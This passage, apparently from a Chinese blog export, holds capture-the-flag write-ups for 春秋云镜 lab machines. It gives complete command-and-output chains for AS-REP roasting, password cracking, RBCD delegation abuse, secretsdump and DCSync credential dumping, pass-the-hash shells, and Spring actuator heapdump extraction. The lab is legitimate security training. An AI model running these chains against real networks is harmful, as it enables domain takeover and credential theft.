zhangrui@xiaorang.lab      |\n| zhangshuai@xiaorang.lab    |\n| zhangtao@xiaorang.lab      |\n| zhangting@xiaorang.lab     |\n| zhangwei@xiaorang.lab      |\n| zhangwen@xiaorang.lab      |\n| zhangxia@xiaorang.lab      |\n| zhangxin@xiaorang.lab      |\n| zhangxue@xiaorang.lab      |\n| zhangyan@xiaorang.lab      |\n| zhangying@xiaorang.lab     |\n| zhangyong@xiaorang.lab     |\n| zhangyu@xiaorang.lab       |\n| zhangyun@xiaorang.lab      |\n| zhaojing@xiaorang.lab      |\n| zhaojun@xiaorang.lab       |\n| zhaoli@xiaorang.lab        |\n| zhaomin@xiaorang.lab       |\n| zhaowei@xiaorang.lab       |\n| zhaoyong@xiaorang.lab      |\n| zhoujie@xiaorang.lab       |\n| zhoujing@xiaorang.lab      |\n| zhouli@xiaorang.lab        |\n| zhoumin@xiaorang.lab       |\n| zhouwei@xiaorang.lab       |\n| zhouyong@xiaorang.lab      |\n+----------------------------+\n~~~\n\n将邮箱取出来\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# grep -E \" [^| ].*lab \" 1 -o > 2\n~~~\n\n然后打 `AS-REP Rroasting`\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# impacket-GetNPUsers xiaorang.lab/ -dc-ip 172.22.60.8 -usersfile 2\n....\n$krb5asrep$ 23 $wangyun@xiaorang.lab@XIAORANG.LAB:5addef2c40ec88e399e44de7ce033d96$ d6aaf3b1c9a159b341c3bae1a662aa8743446421b4cc6dce7eb9ef56c2f1b6be9a02803e6338077443b120df8460bd985b426021b7413698623d7230ecc39b3046b31a19f7e69f375d535b31fdb7fbf1ac06cbf094ad02de073712bc084678d63f1deb6a5347191cd97e69b6e26ab2a1cfa9e2146f4db57678c959ee7db72fc4f210558a410f75e38c48755eb151fac7dfd41c4c9ad6d05e050b815ec59cff9826fdb89f0222c5f8470759a50b5aeb87d50b99b6be487938bb7c1c9a10ae4e9c45b5759742f507863e35113f72cfeac3532f15ed584cac1a321e1f3e38fa3b90769f559cf8b5bebf50148825\n....\n$krb5asrep$ 23 $zhangxin@xiaorang.lab@XIAORANG.LAB:e392adc6c3ca1cd1e039b2c719fbd4de$ 7cf0bfb4a6e46c67fde82e5b3a35db844d3aac45f1b0b842a302386db4f5c7e5d8622a45ff4d0df17489382f47f15b3e268a320a202020838d37f6beeb0ff79bed8b1f3c6f52681a4caeee928c6cebb3bf9b536197e6c40787b1045ac7708d1fbc2e07316b875ccd0ef1f308ad323d21c6d30adf30b2d4287e121b140c579944b21a19329727e98162c05398112bdf14be295c71a373e9a3211efc7fbb5be1074aafc53bc56adc1aeb3c76238623ccc753160eac09b99ec0738b3c5a26b4cee39ea6a797503f87bb9eb36a543326b22f4be1e307b08734467296cd027d7bb5de0761dfcf811975fcf5dc8f8a\n~~~\n\n可以跑出来两条，然后用 john 爆破\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# john pass -w =/usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 2 password hashes with 2 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nAdm12geC         ($krb5asrep$ 23$wangyun@xiaorang.lab@XIAORANG.LAB)\n~~~\n\n可以爆破出来 wangyun 的密码，然后用 blood-hound 进行域内信息搜集\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# bloodhound-python -u wangyun -p Adm12geC -d xiaorang.lab -dc DC.xiaorang.lab -c all --dns-tcp -ns 172.22.60.8 --auth\n-method ntlm --zip\nINFO: Found AD domain: xiaorang.lab\nINFO: Connecting to LDAP server: DC.xiaorang.lab\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 3 computers\nINFO: Connecting to LDAP server: DC.xiaorang.lab\nINFO: Found 12 users\nINFO: Found 52 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: fileserver.xiaorang.lab\nINFO: Querying computer: PC1.xiaorang.lab\nINFO: Querying computer: DC.xiaorang.lab\nWARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.\nWARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.\nWARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.\nWARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.\nWARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.\nINFO: Done in 00M 09S\nINFO: Compressing output into 20250504234223_bloodhound.zip\n~~~\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Flarum1.png)\n\n可以发现 zhangxin 属于 Acount Operators，因此对域内非域控的所有机器都具有 GenericAll 权限，而 FILESERVER 机器有 DCSync，思路就很明显了\n\n首先远程桌面连接 172.22.60.15\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Flarum2.png)\n\n发现桌面上有一个 xshell，利用 [工具](https://github.com/JDArmy/SharpXDecrypt) 将 xshell 的凭证导出\n\n~~~\nPS C:\\Users\\wangyun\\Desktop > .\\SharpXDecrypt.exe\n\nXshell 全版本凭证一键导出工具!(支持 Xshell 7.0+版本)\nAuthor: 0pen1\nGithub: https://github.com/JDArmy\n[!] WARNING: For learning purposes only, please delete it within 24 hours after downloading!\n\n[*] Start GetUserPath....\n  UserPath: C:\\Users\\wangyun\\Documents\\NetSarang Computer\\7\n[*] Get UserPath Success !\n\n[*] Start GetUserSID....\n  Username: wangyun\n  userSID: S-1-5-21-3535393121-624993632-895678587-1107\n[*] GetUserSID Success !\n\n  XSHPath: C:\\Users\\wangyun\\Documents\\NetSarang Computer\\7\\Xshell\\Sessions\\SSH.xsh\n  Host: 172.22.60.45\n  UserName: zhangxin\n  Password: admin4qwY38cc\n  Version: 7.1\n\n[*] read done\n~~~\n\n抓到了 zhangxin 的密码，然后打 RBCD\n\n~~~\nPS C:\\Users\\zhangxin\\Desktop > Set-ExecutionPolicy Bypass -Scope Process\n\n执行策略更改\n执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如\nhttps:/go.microsoft.com/fwlink/?LinkID = 135170 中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?\n[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): Y\nPS C:\\Users\\zhangxin\\Desktop > import-module .\\Powermad.ps1\nPS C:\\Users\\zhangxin\\Desktop > New-MachineAccount -MachineAccount test -Password $(ConvertTo-SecureString \" 123456 \" -AsPlainText -Force)\n[+] Machine account test added\nPS C:\\Users\\zhangxin\\Desktop > import-module .\\powerview.ps1\nPS C:\\Users\\zhangxin\\Desktop > Get-NetComputer test -Properties objectsid\n\nobjectsid\n---------\nS-1-5-21-3535393121-624993632-895678587-1117\n\n\nPS C:\\Users\\zhangxin\\Desktop > $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \" O: BAD:(A;; CCDCLCSWRPWPDTLOCRSDRCWDWO;;; S-1-5-21-3535393121-624993632-895678587-1117)\"\nPS C:\\Users\\zhangxin\\Desktop > $SDBytes = New-Object byte[] ($ SD.BinaryLength)\nPS C:\\Users\\zhangxin\\Desktop > $SD.GetBinaryForm($ SDBytes, 0)\nPS C:\\Users\\zhangxin\\Desktop > Get-DomainComputer Fileserver| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose\n详细信息: [Get-DomainSearcher] search string: LDAP://DC.xiaorang.lab/DC = xiaorang, DC = lab\n详细信息: [Get-DomainObject] Get-DomainObject filter string:\n(&(|(distinguishedname = CN = FILESERVER, CN = Computers, DC = xiaorang, DC = lab)))\n详细信息: [Set-DomainObject] Setting 'msds-allowedtoactonbehalfofotheridentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0\n 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 97 209\n185 210 96 165 64 37 123 248 98 53 93 4 0 0' for object 'FILESERVER$'\nPS C:\\Users\\zhangxin\\Desktop >\n~~~\n\n然后修改/etc/hosts\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# cat /etc/hosts\n127.0.0.1       localhost\n127.0.1.1       kali.kali       kali\n\n# The following lines are desirable for IPv6 capable hosts\n:: 1     localhost ip6-localhost ip6-loopback\nff02:: 1 ip6-allnodes\nff02:: 2 ip6-allrouters\n172.22.60.15 PC1.xiaorang.lab\n172.22.60.42 FILESERVER.xiaorang.lab\n~~~\n\n然后申请票据就行了\n\n~~~\nimpacket-getST -dc-ip 172.22.60.8 xiaorang.lab/test\\$: 123456 -spn cifs/Fileserver.xiaorang.lab -impersonate administrator\nexport KRB5CCNAME = administrator.ccache\nproxychains python3 psexec.py Administrator@FILESERVER.xiaorang.lab -k -no-pass -dc-ip 172.22.60.8 -codec gbk\n~~~\n\n但是后面我又发现一种更简单的方法\n\n~~~\nproxychains python3 addcomputer.py xiaorang.lab/zhangxin:'admin4qwY38cc' -dc-ip 172.22.60.8 -dc-host xiaorang.lab -computer-name 'TEST2$' -computer-pass 'P@ssw0rd'\n\nproxychains python3 rbcd.py xiaorang.lab/zhangxin:'admin4qwY38cc' -dc-ip 172.22.60.8 -action write -delegate-to 'Fileserver $' -delegate-from 'TEST2$'\n\nproxychains python3 getST.py xiaorang.lab/'TEST2$':'P@ssw0rd' -spn cifs/Fileserver.xiaorang.lab -impersonate Administrator -dc-ip 172.22.60.8\n~~~\n\n后面也是\n\n~~~\nexport KRB5CCNAME = administrator.ccache\nproxychains python3 psexec.py Administrator@FILESERVER.xiaorang.lab -k -no-pass -dc-ip 172.22.60.8 -codec gbk\n~~~\n\nflag 在 C:\\users\\administrator\\flag 下\n\n# FLAG02&FLAG04\n\n抓一下 FILESERVER 的哈希\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# secretsdump.py -k -no-pass FILESERVER.xiaorang.lab -dc-ip 172.22.60.8\nImpacket v0.9.24 - Copyright 2021 SecureAuth Corporation\n\n[*] Service RemoteRegistry is in stopped state\n[*] Starting service RemoteRegistry\n[*] Target system bootKey: 0xef418f88c0327e5815e32083619efdf5\n[*] Dumping local SAM hashes (uid: rid: lmhash: nthash)\nAdministrator: 500: aad3b435b51404eeaad3b435b51404ee: bd8e2e150f44ea79fff5034cad4539fc:::\nGuest: 501: aad3b435b51404eeaad3b435b51404ee: 31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount: 503: aad3b435b51404eeaad3b435b51404ee: 31d6cfe0d16ae931b73c59d7e0c089c0:::\nWDAGUtilityAccount: 504: aad3b435b51404eeaad3b435b51404ee: b40dda6fd91a2212d118d83e94b61b11:::\n[*] Dumping cached domain logon information (domain/username: hash)\nXIAORANG.LAB/Administrator: $DCC2$ 10240#Administrator#f9224930044d24598d509aeb1a015766\n[*] Dumping LSA Secrets\n[*] $MACHINE.ACC\nXIAORANG\\Fileserver$: plain_password_hex: 3000310078005b003b0049004e003500450067003e00300039003f0074006c00630024003500450023002800220076003c004b0057005e0063006b005100580024007300620053002e0038002c0060003e00420021007200230030003700470051007200640054004e0078006000510070003300310074006d006b004c002e002f0059003b003f0059002a005d002900640040005b0071007a0070005d004000730066006f003b0042002300210022007400670045006d0023002a002800330073002c00320063004400720032002f003d0078006a002700550066006e002f003a002a0077006f0078002e0066003300\nXIAORANG\\Fileserver$: aad3b435b51404eeaad3b435b51404ee: 951d8a9265dfb652f42e5c8c497d70dc:::\n[*] DPAPI_SYSTEM\ndpapi_machinekey: 0x15367c548c55ac098c599b20b71d1c86a2c1f610\ndpapi_userkey: 0x28a7796c724094930fc4a3c5a099d0b89dccd6d1\n[*] NL$KM\n 0000   8B 14 51 59 D7 67 45 80  9F 4A 54 4C 0D E1 D3 29   ..QY.gE..JTL...)\n 0010   3E B6 CC 22 FF B7 C5 74  7F E4 B0 AD E7 FA 90 0D   >..\"...t........\n 0020   1B 77 20 D5 A6 67 31 E9  9E 38 DD 95 B0 60 32 C4   .w ..g1..8...`2.\n 0030   BE 8E 72 4D 0D 90 01 7F  01 30 AC D7 F8 4C 2B 4A   ..rM.....0...L+J\nNL$KM: 8b145159d76745809f4a544c0de1d3293eb6cc22ffb7c5747fe4b0ade7fa900d1b7720d5a66731e99e38dd95b06032c4be8e724d0d90017f0130acd7f84c2b4a\n[*] Cleaning up...\n[*] Stopping service RemoteRegistry\n~~~\n\n然后进行 DcSync 攻击导出域控哈希\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# secretsdump.py xiaorang.lab/'Fileserver$':@172.22.60.8 -hashes ': 951d8a9265dfb652f42e5c8c497d70dc'\nImpacket v0.9.24 - Copyright 2021 SecureAuth Corporation\n\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied\n[*] Dumping Domain Credentials (domain\\uid: rid: lmhash: nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator: 500: aad3b435b51404eeaad3b435b51404ee: c3cfdc08527ec4ab6aa3e630e79d349b:::\nGuest: 501: aad3b435b51404eeaad3b435b51404ee: 31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt: 502: aad3b435b51404eeaad3b435b51404ee: 98194d49adfe247020eaade4a3936d95:::\nchenfang: 1105: aad3b435b51404eeaad3b435b51404ee: 302b5743b0f7b3436591aedf550ded5b:::\nzhanghao: 1106: aad3b435b51404eeaad3b435b51404ee: 4c37e7a022daf856bfa2b16824696ab5:::\nwangyun: 1107: aad3b435b51404eeaad3b435b51404ee: 561d64b9a1c943db32810fb5586a4be9:::\nzhangwei: 1108: aad3b435b51404eeaad3b435b51404ee: 3d2f864635abb31f2546dc07cbcd2528:::\nwangkai: 1109: aad3b435b51404eeaad3b435b51404ee: d20a47a4529552805d96a24c3020384c:::\nyangyan: 1110: aad3b435b51404eeaad3b435b51404ee: 4f80f967fd586f4212bc264a7d1f6789:::\nzhangxin: 1111: aad3b435b51404eeaad3b435b51404ee: 38780e101b28bb9b9036fc3e2e4f35e6:::\nwangping: 1112: aad3b435b51404eeaad3b435b51404ee: 0adf6fb0f808be95d449e3b6c67b02dc:::\nDC$: 1000: aad3b435b51404eeaad3b435b51404ee: f0cc8fa9ded68237e1861cfa3f28d483:::\nPC1$: 1103: aad3b435b51404eeaad3b435b51404ee: 5fbf6f7f779da62fe4db9d8448cebed5:::\nFILESERVER$: 1114: aad3b435b51404eeaad3b435b51404ee: 951d8a9265dfb652f42e5c8c497d70dc:::\ntest1$: 1116: aad3b435b51404eeaad3b435b51404ee: 32ed87bdb5fdc5e9cba88547376818d4:::\nlv$: 1117: aad3b435b51404eeaad3b435b51404ee: 32ed87bdb5fdc5e9cba88547376818d4:::\nevailpc$: 1118: aad3b435b51404eeaad3b435b51404ee: 8846f7eaee8fb117ad06bdd830b7586c:::\nll$: 1119: aad3b435b51404eeaad3b435b51404ee: 32ed87bdb5fdc5e9cba88547376818d4:::\nTEST2$: 1120: aad3b435b51404eeaad3b435b51404ee: e19ccf75ee54e06b06a5907af13cef42:::\n[*] Kerberos keys grabbed\nAdministrator: aes256-cts-hmac-sha1-96:4502e83276d2275a8f22a0be848aee62471ba26d29e0a01e2e09ddda4ceea683\nAdministrator: aes128-cts-hmac-sha1-96:38496df9a109710192750f2fbdbe45b9\nAdministrator: des-cbc-md5: f72a9889a18cc408\nkrbtgt: aes256-cts-hmac-sha1-96:01cbdd6e9fcb7381f08f6ff1c3698f5642e1fd7b2a0dee8c85b9ad370a09abdd\nkrbtgt: aes128-cts-hmac-sha1-96: edde21e07fc8dc56b0d5c7f1cec73691\nkrbtgt: des-cbc-md5:8adace38ba738a34\nchenfang: aes256-cts-hmac-sha1-96:2c06b19f9f574ee1e7db61071aece803de7af58d229b3529e04d9ec38aac5941\nchenfang: aes128-cts-hmac-sha1-96:4014efeb6533ba5a572fc41826573c46\nchenfang: des-cbc-md5: f2ba8f496e702664\nzhanghao: aes256-cts-hmac-sha1-96: ea51257d0834bdeabc87c48fede2ede9b9833d6d87dcc1ed26747a5990dbb301\nzhanghao: aes128-cts-hmac-sha1-96:5efc32f73f2cff27f49b80346d0ab172\nzhanghao: des-cbc-md5: ef19c776ef4caef7\nwangyun: aes256-cts-hmac-sha1-96:5aac300487414042e25eb1fffe5681392a8c0013c27413c6982b19445032db9a\nwangyun: aes128-cts-hmac-sha1-96:8a2c325e83084282896dcdc40d5780fe\nwangyun: des-cbc-md5: c434a716fe7ad3dc\nzhangwei: aes256-cts-hmac-sha1-96:8ccb33735cb1be69c9e115ecde51ce41d33ee297446d4603ec43f6367ed9c77b\nzhangwei: aes128-cts-hmac-sha1-96:1fdbe52915e9ccb03b813a2f0215b0c1\nzhangwei: des-cbc-md5:7998f12a86024a07\nwangkai: aes256-cts-hmac-sha1-96:76eb8643be14b795327e149899984c077a0db78b4af7faaf45759ef87e44e6a8\nwangkai: aes128-cts-hmac-sha1-96:4ce9f8c194b606feca44d2c84a8b3215\nwangkai: des-cbc-md5: e9ec9bb95b514902\nyangyan: aes256-cts-hmac-sha1-96: e5c045bcb69ef53b66405645764f811b55909c2f67e3b9c5c816e584711206ba\nyangyan: aes128-cts-hmac-sha1-96: b5b5780c2b9014223fff940e2d0ddb99\nyangyan: des-cbc-md5: f2ae7ccb756d2c20\nzhangxin: aes256-cts-hmac-sha1-96:06f75e8f90bff7ef536d682da9ce719c235d54d4660936aaf71499859960e8b3\nzhangxin: aes128-cts-hmac-sha1-96: fdb55e032fd0647f4519e225544b3de6\nzhangxin: des-cbc-md5: df67d6b59d106710\nwangping: aes256-cts-hmac-sha1-96: d0c1d5bf581d866b7a57c4b75d8dccf2d996d0f91226cd13dae1ebad02c220e0\nwangping: aes128-cts-hmac-sha1-96: db24cb50818548f0d70ff12b7e94e5bf\nwangping: des-cbc-md5: e31c10866b6e1af1\nDC$: aes256-cts-hmac-sha1-96:2177cba61e6bef5c2358728bbd38fcf555a385ca2bc21a7bee0eb7082bc43009\nDC$: aes128-cts-hmac-sha1-96:2a93500066caecc8ca1fd443dfe71045\nDC$: des-cbc-md5: d99d163738d0514a\nPC1$: aes256-cts-hmac-sha1-96:6f9ab6bbf92b25ffc47a2e2e4d02611810153ed1f638ad0661a1c2ba6a44c35b\nPC1$: aes128-cts-hmac-sha1-96: a332459ac3ed4676081045169db6642f\nPC1$: des-cbc-md5: c1bf253e7abcfe3e\nFILESERVER$: aes256-cts-hmac-sha1-96:3c57a20b8c4506d147055c344c6a1b029ad98df9885950b4962a5da1d737bf81\nFILESERVER$: aes128-cts-hmac-sha1-96: e199679dc0624225beb20d195bcebf89\nFILESERVER$: des-cbc-md5: cb98a7ce7043a7ba\ntest1$: aes256-cts-hmac-sha1-96:12d38e3177a4f263be6da2f3ec99357341205fc563c165866aee4a6d46f55801\ntest1$: aes128-cts-hmac-sha1-96:87646137635d8377a3558ed890818c8e\ntest1$: des-cbc-md5: b561234070166d9b\nlv$: aes256-cts-hmac-sha1-96: b5e3de41bfde0550d7c122c2521ccdf1f071679d01823c8e7a3102bd060ae9ef\nlv$: aes128-cts-hmac-sha1-96: bd32120973f173a6aea2d174072dffb1\nlv$: des-cbc-md5:38e397adbc027f4c\nevailpc$: aes256-cts-hmac-sha1-96:9d216633c05f405b584a68b418250a99c47de5afaa8261cbaa85e71c1a450b38\nevailpc$: aes128-cts-hmac-sha1-96:7d88d455f095e199cc2a9b97ce72b38c\nevailpc$: des-cbc-md5:8664376ea2cb5280\nll$: aes256-cts-hmac-sha1-96:2ee5b4caa01084d7cefb60fce5daa2bb35e2c06bdb4b56516b0d5f1f926819df\nll$: aes128-cts-hmac-sha1-96:5db4f55cb677946d95a74a19df68ab44\nll$: des-cbc-md5: d37615076e451ca8\nTEST2$: aes256-cts-hmac-sha1-96:6fad46be8d54b5431df61db10866c987d2c64ff528419ec0ee7f7a38d6e7ee6f\nTEST2$: aes128-cts-hmac-sha1-96:476a93fc85b66f3861e3b51e39f3b8d0\nTEST2$: des-cbc-md5:640780a13ee357c7\n[*] Cleaning up...\n~~~\n\n拿到域控之后就横向就可以了\n\n~~~\nwmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee: c3cfdc08527ec4ab6aa3e630e79d349b xiaorang.lab/Administrator@172.22.60.15\nImpacket v0.9.24 - Copyright 2021 SecureAuth Corporation\n\n[*] SMBv3.0 dialect used\n[!] Launching semi-interactive shell - Careful what you execute\n[!] Press help for extra shell commands\nC:\\>\n~~~\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee: c3cfdc08527ec4ab6aa3e630e79d349b xiaorang.lab/Administrator@172.22.60.8\nImpacket v0.9.24 - Copyright 2021 SecureAuth Corporation\n\n[*] SMBv3.0 dialect used\n[!] Launching semi-interactive shell - Careful what you execute\n[!] Press help for extra shell commands\nC:\\>\n~~~\n\n","tags":["靶机"],"categories":["春秋云镜"]},{"title":"春秋云镜-ThermalPower","url":"/2025/05/02/春秋云镜-ThermalPower/","content":"\n# FLAG01\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# ../../pentest/fscan/fscan2 -h 39.98.122.145\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\n│  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     │\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-05-01 23:10:46] [INFO] 暴力破解线程数: 1\n[2025-05-01 23:10:46] [INFO] 开始信息扫描\n[2025-05-01 23:10:46] [INFO] 最终有效主机数量: 1\n[2025-05-01 23:10:46] [INFO] 开始主机扫描\n[2025-05-01 23:10:46] [INFO] 有效端口数量: 233\n[2025-05-01 23:10:46] [SUCCESS] 端口开放 39.98.122.145:22\n[2025-05-01 23:10:47] [SUCCESS] 服务识别 39.98.122.145:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]\n[2025-05-01 23:10:49] [SUCCESS] 端口开放 39.98.122.145:8080\n[2025-05-01 23:10:54] [SUCCESS] 服务识别 39.98.122.145:8080 => [http]\n[2025-05-01 23:10:56] [INFO] 存活端口数量: 2\n[2025-05-01 23:10:56] [INFO] 开始漏洞扫描\n[2025-05-01 23:10:56] [INFO] 加载的插件: ssh, webpoc, webtitle\n[2025-05-01 23:10:56] [SUCCESS] 网站标题 http://39.98.122.145:8080 状态码:302 长度:0      标题:无标题 重定向地址: http://39.98.122.145:8080/login;jsessionid=C10B39BA0BC886E7924F52A8BA23B5B6\n[2025-05-01 23:10:57] [SUCCESS] 网站标题 http://39.98.122.145:8080/login;jsessionid=C10B39BA0BC886E7924F52A8BA23B5B6 状 态码:200 长度:2936   标题:火创能源监控画面管理平台\n[2025-05-01 23:11:00] [SUCCESS] 目标: http://39.98.122.145:8080\n  漏洞类型: poc-yaml-spring-actuator-heapdump-file\n  漏洞名称:\n  详细信息:\n        author:AgeloVito\n        links:https://www.cnblogs.com/wyb628/p/8567610.html\n[2025-05-01 23:11:00] [SUCCESS] 目标: http://39.98.122.145:8080\n  漏洞类型: poc-yaml-springboot-env-unauth\n  漏洞名称: spring2\n  详细信息:\n        links:https://github.com/LandGrey/SpringBootVulExploit\n[2025-05-01 23:11:03] [SUCCESS] 扫描已完成: 3/3\n~~~\n\n可以扫有8080端口有一个poc-yaml-spring-actuator-heapdump-file，先将heapdump文件下载下来\t\n\n~~~~\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# wget  http://39.98.122.145:8080/actuator/heapdump\n--2025-05-01 23:13:13--  http://39.98.122.145:8080/actuator/heapdump\nConnecting to 39.98.122.145:8080... connected.\nHTTP request sent, awaiting response... 200\nLength: 31181349 (30M) [application/octet-stream]\nSaving to: ‘heapdump’\n\nheapdump                      100%[=================================================>]  29.74M  1.36MB/s    in 21s\n\n2025-05-01 23:13:35 (1.41 MB/s) - ‘heapdump’ saved [31181349/31181349]\n~~~~\n\n然后用工具进行分析\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump\n===========================================\nSpringDataSourceProperties\n-------------\nnot found!\n\n===========================================\nWeblogicDataSourceConnectionPoolConfig\n-------------\nnot found!\n\n===========================================\nMongoClient\n-------------\nnot found!\n\n===========================================\nAliDruidDataSourceWrapper\n-------------\nnot found!\n\n===========================================\nHikariDataSource\n-------------\nnot found!\n\n===========================================\nRedisStandaloneConfiguration\n-------------\nnot found!\n\n===========================================\nJedisClient\n-------------\nnot found!\n\n===========================================\nCookieRememberMeManager(ShiroKey)\n-------------\nalgMode = CBC, key = QZYysgMYhG6/CzIJlVpR2g==, algName = AES\n\n===========================================\nOriginTrackedMapPropertySource\n-------------\nmanagement.endpoints.web.exposure.include = *\nspring.thymeleaf.encoding = UTF-8\nmanagement.endpoint.health.show-details = always\nspring.thymeleaf.cache = true\nspring.thymeleaf.content-type = text/html\nserver.port = 8080\nspring.thymeleaf.check-template = true\nmanagement.endpoints.jmx.exposure.include = *\n\n===========================================\nMutablePropertySources\n-------------\nawt.toolkit = sun.awt.X11.XToolkit\nsun.boot.class.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classes\njava.protocol.handler.pkgs = org.springframework.boot.loader\nsun.management.compiler = HotSpot 64-Bit Tiered Compilers\nsun.cpu.isalist =\nsun.jnu.encoding = UTF-8\njava.runtime.version = 1.8.0_392-8u392-ga-1~20.04-b08\njava.class.path = /opt/ThermalSecurity/Thermal-Security-0.0.1-SNAPSHOT.jar\npath.separator = :\njava.vm.vendor = Private Build\nos.version = 5.4.0-166-generic\njava.endorsed.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsed\njava.runtime.name = OpenJDK Runtime Environment\nfile.encoding = UTF-8\ncatalina.useNaming = false\nspring.beaninfo.ignore = true\njava.vm.specification.version = 1.8\nos.name = Linux\njava.vm.name = OpenJDK 64-Bit Server VM\nlocal.server.port = null\nuser.country = US\njava.vendor.url.bug = http://bugreport.sun.com/bugreport/\nsun.java.command = /opt/ThermalSecurity/Thermal-Security-0.0.1-SNAPSHOT.jar\njava.io.tmpdir = /tmp\ncatalina.home = /tmp/tomcat.8080.2227855515484347988\njava.version = 1.8.0_392\nuser.home = /root\nuser.language = en\nPID = 620\njava.awt.printerjob = sun.print.PSPrinterJob\nCONSOLE_LOG_CHARSET = UTF-8\nfile.separator = /\ncatalina.base = /tmp/tomcat.8080.2227855515484347988\njava.vm.info = mixed mode\njava.specification.name = Java Platform API Specification\njava.vm.specification.vendor = Oracle Corporation\nFILE_LOG_CHARSET = UTF-8\njava.awt.graphicsenv = sun.awt.X11GraphicsEnvironment\njava.awt.headless = true\nsun.io.unicode.encoding = UnicodeLittle\njava.ext.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext\n\n===========================================\nMapPropertySources\n-------------\nlocal.server.port = null\n\n===========================================\nConsulPropertySources\n-------------\nnot found!\n\n===========================================\nJavaProperties\n-------------\njava.util.logging.FileHandler.pattern = %h/java%u.log\nawt.toolkit = sun.awt.X11.XToolkit\nsun.cpu.isalist =\nsun.jnu.encoding = UTF-8\njava.class.path = /opt/ThermalSecurity/Thermal-Security-0.0.1-SNAPSHOT.jar\njdk.security.legacyAlgorithms = SHA1, RSA keySize < 2048, DSA keySize < 2048\njava.vm.vendor = Private Build\njdk.disabled.namedCurves = secp112r1, secp112r2, secp128r1, secp128r2, secp160k1, secp160r1, secp160r2, secp192k1, secp192r1, secp224k1, secp224r1, secp256k1, sect113r1, sect113r2, sect131r1, sect131r2, sect163k1, sect163r1, sect163r2, sect193r1, sect193r2, sect233k1, sect233r1, sect239k1, sect283k1, sect283r1, sect409k1, sect409r1, sect571k1, sect571r1, X9.62 c2tnb191v1, X9.62 c2tnb191v2, X9.62 c2tnb191v3, X9.62 c2tnb239v1, X9.62 c2tnb239v2, X9.62 c2tnb239v3, X9.62 c2tnb359v1, X9.62 c2tnb431r1, X9.62 prime192v2, X9.62 prime192v3, X9.62 prime239v1, X9.62 prime239v2, X9.62 prime239v3, brainpoolP256r1, brainpoolP320r1, brainpoolP384r1, brainpoolP512r1\ncrypto.policy = unlimited\njceks.key.serialFilter = 